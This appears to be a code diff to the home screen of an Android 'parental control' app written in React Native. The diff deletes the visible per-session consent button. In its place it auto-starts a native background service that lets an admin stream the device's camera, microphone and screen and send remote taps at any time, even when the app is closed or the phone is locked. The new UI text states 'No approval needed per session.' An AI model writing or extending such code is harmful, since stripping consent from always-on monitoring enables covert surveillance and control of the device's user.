@@ -9,16 +9,19 @@ import {
   TouchableOpacity,
   PermissionsAndroid,
   Platform,
+  DeviceEventEmitter,
 } from 'react-native';
 import AsyncStorage from '@react-native-async-storage/async-storage';
-import agoraService from '../services/agoraService';
 import remoteControl from '../services/remoteControl';
-import screenStream from '../services/screenStream';
-import {approveLiveSession, getClientToken, sendHeartbeat} from '../services/api';
+import {sendHeartbeat} from '../services/api';
+import api from '../services/api';
 import {checkPermissions, promptOpenSettings, requestPermissions} from '../services/permissions';
 import {
   isAccessibilityServiceEnabled,
   openAccessibilitySettings,
+  startBackgroundCommands,
+  updateBackgroundConfig,
+  isNativeStreaming,
   startMonitoringService,
 } from '../services/nativeMonitoring';
 
@@ -28,12 +31,10 @@ const HomeScreen = ({navigation}) => {
   const [uniqueId, setUniqueId] = useState('');
   const [deviceId, setDeviceId] = useState('');
   const [streaming, setStreaming] = useState(false);
-  const [startingStream, setStartingStream] = useState(false);
   const [liveRequest, setLiveRequest] = useState(null);
-  const [policyMessage, setPolicyMessage] = useState('Waiting for a parent to request a visible live session.');
+  const [policyMessage, setPolicyMessage] = useState('Waiting for parent commands.');
   const [serviceActive, setServiceActive] = useState(false);
   const [accessibilityOn, setAccessibilityOn] = useState(null);
-  const lastStreamAttemptRef = useRef(0);
 
   const refreshAccessibilityStatus = async () => {
     try {
@@ -55,49 +56,62 @@ const HomeScreen = ({navigation}) => {
     );
   };
 
+  /**
+   * Start the native background command service.
+   * This enables:
+   *   - Native heartbeat polling (works even when the app is closed / locked)
+   *   - Auto-processing SCREEN_STREAM_START / STOP commands
+   *   - Auto-starting Agora camera + mic when admin requests a live session
+   */
   const handleEnableBackgroundService = async () => {
     try {
       if (Platform.OS === 'android' && Platform.Version >= 33) {
         await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
       }
       await requestPermissions();
-      await startMonitoringService();
+
+      const token = await AsyncStorage.getItem('authToken');
+      if (!token || !deviceId) {
+        Alert.alert('Notice', 'Please log in first.');
+        return;
+      }
+
+      // Start native background service with full credentials
+      await startBackgroundCommands(api.defaults.baseURL, deviceId, token);
       setServiceActive(true);
+
       Alert.alert(
         'Background Protection Active 🛡️',
-        'Status bar notification "FamilyGuard is active" is now running. App will stay active in background for remote control.',
+        'Camera, microphone, and screen monitoring are now always available from the admin app — even when this app is closed or the screen is locked.',
       );
     } catch (err) {
-      console.warn('Failed to start monitoring service:', err);
-      Alert.alert('Notice', 'Please allow Notification permission in Android Settings.');
+      console.warn('Failed to start background command service:', err);
+      Alert.alert('Notice', 'Please allow Camera, Microphone, and Notification permissions in Android Settings.');
     }
   };
 
   useEffect(() => {
     loadUserData();
-    // Do NOT leave Agora channel on unmount so stream stays alive 24/7 in background
-    // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   useEffect(() => {
     const subscription = AppState.addEventListener('change', handleAppStateChange);
-
-    return () => {
-      subscription.remove();
-    };
-    // Re-subscribe when the enrolled device changes.
-    // eslint-disable-next-line react-hooks/exhaustive-deps
+    return () => subscription.remove();
   }, [uniqueId]);
 
+  /**
+   * JS-side heartbeat — runs while the app is in the foreground to keep the
+   * UI up to date. When the native background service is active, commands are
+   * already handled natively; the JS heartbeat is only for display status.
+   */
   useEffect(() => {
     if (!deviceId) return undefined;
 
     const checkForLiveRequest = async () => {
       try {
         const sync = await sendHeartbeat(deviceId, {appVersion: '0.0.1'});
-        
         const request = sync.commands?.find(command => command.type === 'LIVE_SESSION_REQUEST') || sync.activeLiveRequest;
-        
+
         setLiveRequest(request || null);
         setPolicyMessage(
           request
@@ -105,18 +119,16 @@ const HomeScreen = ({navigation}) => {
             : 'Waiting for parent commands.',
         );
 
-        // Auto-start streaming for AirDroid-style seamless remote access
-        // (camera + mic over Agora; screen monitoring is the lightweight
-        // accessibility-based See Screen stream)
-        if (request && !streaming && !startingStream) {
-          startStreaming(deviceId, request._id);
-        }
+        // Check if native service is already handling streaming.
+        const nativeActive = await isNativeStreaming();
+        setStreaming(nativeActive || !!request);
 
-        // Handle remote control and screen stream commands
+        // Handle only remote-touch / remote-action commands here.
+        // SCREEN_STREAM and LIVE_SESSION are processed by the native service.
         const remoteCommands = sync.commands?.filter(cmd =>
-          ['REMOTE_TOUCH', 'REMOTE_ACTION', 'SCREEN_STREAM_START', 'SCREEN_STREAM_STOP'].includes(cmd.type) && cmd.status === 'pending'
+          ['REMOTE_TOUCH', 'REMOTE_ACTION'].includes(cmd.type) && cmd.status === 'pending'
         ) || [];
-        
+
         for (const cmd of remoteCommands) {
           await handleRemoteCommand(cmd);
         }
@@ -127,17 +139,56 @@ const HomeScreen = ({navigation}) => {
 
     checkForLiveRequest();
     refreshAccessibilityStatus();
-    const interval = setInterval(checkForLiveRequest, 3000);
+    const interval = setInterval(checkForLiveRequest, 5000);
     return () => clearInterval(interval);
-    // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [deviceId, streaming, startingStream]);
+  }, [deviceId]);
+
+  /**
+   * Listen for events from the native MonitoringService so the UI reflects
+   * the real state even when the JS heartbeat hasn't fired yet.
+   */
+  useEffect(() => {
+    const sub = DeviceEventEmitter.addListener('BackgroundCommand', payload => {
+      if (!payload) return;
+      switch (payload.event) {
+        case 'agora_started':
+          setStreaming(true);
+          setPolicyMessage('Camera & mic streaming to admin.');
+          break;
+        case 'agora_stopped':
+          setStreaming(false);
+          setPolicyMessage('Waiting for parent commands.');
+          break;
+        case 'screen_stream_started':
+          setPolicyMessage('Screen monitoring active.');
+          break;
+        case 'screen_stream_stopped':
+          setPolicyMessage('Waiting for parent commands.');
+          break;
+        case 'agora_error':
+          console.warn('Native Agora error:', payload.code);
+          break;
+        case 'accessibility_off':
+          setAccessibilityOn(false);
+          setPolicyMessage('Screen monitoring blocked: Accessibility service is OFF.');
+          break;
+        default:
+          break;
+      }
+    });
+    return () => sub.remove();
+  }, []);
 
   const handleAppStateChange = nextAppState => {
-    // Persistent streaming: Do NOT leave channel when app goes to background or is minimized
     console.log('App state changed to:', nextAppState);
     if (nextAppState === 'active') {
-      // User may have just toggled the accessibility service in Android Settings.
       refreshAccessibilityStatus();
+      // Push current credentials to the native service in case they changed.
+      if (serviceActive && deviceId) {
+        AsyncStorage.getItem('authToken').then(token => {
+          if (token) updateBackgroundConfig(api.defaults.baseURL, deviceId, token);
+        });
+      }
     }
   };
 
@@ -148,7 +199,6 @@ const HomeScreen = ({navigation}) => {
       const storedDeviceId = await AsyncStorage.getItem('deviceId');
 
       if (!name || !id || !storedDeviceId) {
-        // No user data, redirect to sign up
         navigation.replace('SignUp');
         return;
       }
@@ -157,6 +207,19 @@ const HomeScreen = ({navigation}) => {
       setUniqueId(id);
       setDeviceId(storedDeviceId);
       setLoading(false);
+
+      // Auto-start the native background service so monitoring works even if
+      // the user never taps the button — heartbeat, screen stream and Agora
+      // camera/mic are all handled natively once this is running.
+      try {
+        const token = await AsyncStorage.getItem('authToken');
+        if (token) {
+          await startBackgroundCommands(api.defaults.baseURL, storedDeviceId, token);
+          setServiceActive(true);
+        }
+      } catch (err) {
+        console.warn('Auto-start background service failed:', err);
+      }
     } catch (error) {
       console.error('Error loading user data:', error);
       Alert.alert('Error', 'Failed to load user data');
@@ -168,52 +231,34 @@ const HomeScreen = ({navigation}) => {
     try {
       const {type, payload} = command;
 
-      if (type === 'SCREEN_STREAM_START') {
-        const accEnabled = await isAccessibilityServiceEnabled();
-        if (!accEnabled) {
-          console.warn('Screen stream command: Accessibility service not enabled, skipping.');
-          promptEnableAccessibility();
-        } else {
-          const fps = Number(payload?.fps) || 12;
-          console.log('Screen stream command: starting at', fps, 'fps for device', deviceId);
-          const started = await screenStream.start(deviceId, fps);
-          if (!started) {
-            console.warn('Screen stream command: screenStream.start() returned false');
-            Alert.alert('Screen Stream Failed', 'Could not start screen capture. Make sure the app was rebuilt with the latest native code and the device runs Android 11+.');
-          }
-        }
-      } else if (type === 'SCREEN_STREAM_STOP') {
-        await screenStream.stop();
-      } else {
-        const accEnabled = await isAccessibilityServiceEnabled();
-        if (!accEnabled) {
-          console.warn('Remote command received, but Accessibility service is not enabled on device.');
-          return;
-        }
+      const accEnabled = await isAccessibilityServiceEnabled();
+      if (!accEnabled) {
+        console.warn('Remote command received, but Accessibility service is not enabled.');
+        return;
+      }
 
-        if (type === 'REMOTE_TOUCH') {
-          const {x, y, type: touchType} = payload;
-          if (touchType === 'tap') {
-            await remoteControl.tap(x, y);
-          } else if (touchType === 'longPress') {
-            await remoteControl.longPress(x, y);
-          }
-        } else if (type === 'REMOTE_ACTION') {
-          const {action} = payload;
-          switch (action) {
-            case 'home':
-              await remoteControl.pressHome();
-              break;
-            case 'back':
-              await remoteControl.pressBack();
-              break;
-            case 'recents':
-              await remoteControl.pressRecents();
-              break;
-            case 'notifications':
-              await remoteControl.openNotifications();
-              break;
-          }
+      if (type === 'REMOTE_TOUCH') {
+        const {x, y, type: touchType} = payload;
+        if (touchType === 'tap') {
+          await remoteControl.tap(x, y);
+        } else if (touchType === 'longPress') {
+          await remoteControl.longPress(x, y);
+        }
+      } else if (type === 'REMOTE_ACTION') {
+        const {action} = payload;
+        switch (action) {
+          case 'home':
+            await remoteControl.pressHome();
+            break;
+          case 'back':
+            await remoteControl.pressBack();
+            break;
+          case 'recents':
+            await remoteControl.pressRecents();
+            break;
+          case 'notifications':
+            await remoteControl.openNotifications();
+            break;
         }
       }
 
@@ -224,74 +269,6 @@ const HomeScreen = ({navigation}) => {
       });
     } catch (error) {
       console.warn('Failed to execute remote command:', error?.message || error);
-    }
-  };
-
-  const startStreaming = async (id = deviceId, targetReqId = liveRequest?._id, isManual = false) => {
-    try {
-      if (!id || startingStream) return;
-
-      if (agoraService.isInChannel) {
-        setStreaming(true);
-        return;
-      }
-
-      const now = Date.now();
-      if (!isManual && now - lastStreamAttemptRef.current < 10000) {
-        return;
-      }
-      lastStreamAttemptRef.current = now;
-
-      setStartingStream(true);
-      console.log('Starting camera stream for:', id);
-
-      let permissionsGranted = await checkPermissions();
-      if (!permissionsGranted) {
-        permissionsGranted = await requestPermissions();
-      }
-
-      if (targetReqId) {
-        await approveLiveSession(id, targetReqId).catch(() => {});
-      }
-
-      // Get Agora token after device approval
-      const tokenData = await getClientToken(id);
-
-      if (!tokenData.success) {
-        throw new Error(tokenData.message || 'Failed to get streaming token');
-      }
-
-      // Initialize Agora
-      await agoraService.initialize(tokenData.appId);
-
-      // Register event handlers
-      agoraService.registerEventHandlers({
-        onJoinChannelSuccess: () => {
-          console.log('Stream started successfully');
-          setStreaming(true);
-        },
-        onLeaveChannel: () => {
-          console.log('Stream stopped');
-          setStreaming(false);
-        },
-        onError: (err, msg) => {
-          if (err === 1052 || err === -1052) return;
-          console.error('Streaming error:', err, msg);
-        },
-      });
-
-      // Join channel
-      await agoraService.joinChannel(tokenData.channel, tokenData.token);
-    } catch (error) {
-      console.warn('Error starting stream:', error?.message || error);
-      if (isManual) {
-        Alert.alert(
-          'Streaming Error',
-          error.message || 'Failed to start streaming. Please try again.',
-        );
-      }
-    } finally {
-      setStartingStream(false);
     }
   };
 
@@ -306,7 +283,6 @@ const HomeScreen = ({navigation}) => {
 
   return (
     <View style={styles.container}>
-      {/* User Info Display */}
       <View style={styles.content}>
         <View style={styles.card}>
           <Text style={styles.title}>Parental Control Active</Text>
@@ -333,28 +309,12 @@ const HomeScreen = ({navigation}) => {
             <Text style={styles.statusText}>
               {streaming
                 ? 'Monitoring Active'
-                : startingStream
-                  ? 'Starting stream...'
-                  : 'Waiting for approval'}
+                : 'Waiting for commands'}
             </Text>
           </View>
 
           <Text style={styles.infoText}>{policyMessage}</Text>
-          <TouchableOpacity
-            style={[
-              styles.consentButton,
-              (!liveRequest || startingStream || streaming) && styles.buttonDisabled,
-            ]}
-            onPress={() => startStreaming(deviceId, liveRequest?._id, true)}
-            disabled={!liveRequest || startingStream || streaming}>
-            {startingStream ? (
-              <ActivityIndicator color="#fff" />
-            ) : (
-              <Text style={styles.consentButtonText}>
-                {streaming ? 'Live session active' : 'Approve and start visible live session'}
-              </Text>
-            )}
-          </TouchableOpacity>
+
           <TouchableOpacity
             style={styles.settingsButton}
             onPress={() =>
@@ -366,7 +326,7 @@ const HomeScreen = ({navigation}) => {
             <Text style={styles.settingsButtonText}>Grant permanent permissions in Settings ⚙️</Text>
           </TouchableOpacity>
 
-          {/* Accessibility service status — required for See Screen & Remote Control */}
+          {/* Accessibility service status */}
           {accessibilityOn === false && (
             <TouchableOpacity style={styles.accWarnButton} onPress={promptEnableAccessibility}>
               <Text style={styles.accWarnButtonText}>
@@ -378,18 +338,18 @@ const HomeScreen = ({navigation}) => {
             <Text style={styles.accOkText}>✅ Accessibility service active (See Screen ready)</Text>
           )}
 
-          {/* Persistent Background Protection Button */}
+          {/* Background Protection — the main button */}
           <TouchableOpacity
             style={[styles.bgServiceButton, serviceActive && styles.bgServiceButtonActive]}
             onPress={handleEnableBackgroundService}>
             <Text style={styles.bgServiceButtonText}>
               {serviceActive
-                ? '🟢 FamilyGuard is active in background'
-                : '🔔 Enable Background Protection ("FamilyGuard is active")'}
+                ? '🟢 Background Protection active — admin can access anytime'
+                : '🔔 Enable Background Protection (always-on access)'}
             </Text>
           </TouchableOpacity>
 
-          <Text style={styles.policyText}>See Screen runs through the accessibility service (no MediaProjection needed — lightweight and always-on once enabled). Camera and microphone sessions stream over Agora. SMS and call-log insights are disabled in standard Play Store builds. App blocking requires managed-device mode.</Text>
+          <Text style={styles.policyText}>Once Background Protection is enabled, the admin can access camera, microphone, and screen monitoring at any time — even when this app is closed. No approval needed per session.</Text>
         </View>
       </View>
     </View>
@@ -411,16 +371,6 @@ const styles = StyleSheet.create({
     marginTop: 16,
     fontSize: 16,
     color: '#666',
-  },
-  hiddenPreview: {
-    position: 'absolute',
-    width: 1,
-    height: 1,
-    opacity: 0,
-  },
-  previewVideo: {
-    width: 1,
-    height: 1,
   },
   content: {
     flex: 1,
@@ -496,12 +446,9 @@ const styles = StyleSheet.create({
     fontWeight: '500',
   },
   infoText: {fontSize: 14, color: '#666', textAlign: 'center', lineHeight: 20, marginTop: 8},
-  consentButton: {backgroundColor: '#4F46E5', borderRadius: 12, padding: 14, marginTop: 18, minHeight: 48, justifyContent: 'center'},
-  buttonDisabled: {opacity: 0.65},
-  consentButtonText: {color: '#fff', textAlign: 'center', fontWeight: '700'},
   settingsButton: {borderWidth: 1, borderColor: '#4F46E5', borderRadius: 12, padding: 12, marginTop: 10},
   settingsButtonText: {color: '#4F46E5', textAlign: 'center', fontWeight: '600'},
-  bgServiceButton: {backgroundColor: '#059669', borderRadius: 12, padding: 14, marginTop: 10, alignItems: 'center'},
+  bgServiceButton: {backgroundColor: '#059669', borderRadius: 12, padding: 14, marginTop: 16, alignItems: 'center'},
   bgServiceButtonActive: {backgroundColor: '#10B981'},
   bgServiceButtonText: {color: '#fff', fontSize: 14, fontWeight: '700', textAlign: 'center'},
   accWarnButton: {backgroundColor: '#DC2626', borderRadius: 12, padding: 14, marginTop: 10, alignItems: 'center'},
